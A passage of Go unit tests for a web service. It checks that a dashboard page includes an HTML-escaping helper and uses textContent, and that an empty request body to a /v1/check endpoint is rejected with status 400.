	// Check that the esc() helper exists
	if !strings.Contains(dashboardHTML, "function esc(") {
		t.Error("dashboard should contain esc() HTML escaping helper")
	}

	// Check that textContent is used
	if !strings.Contains(dashboardHTML, "textContent") {
		t.Error("dashboard should use textContent for safe text insertion")
	}
}

// --- Edge case: empty body ---

func TestHandleCheck_EmptyBody(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/check", bytes.NewReader(nil))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for empty body, got %d", w.Code)
	}
}
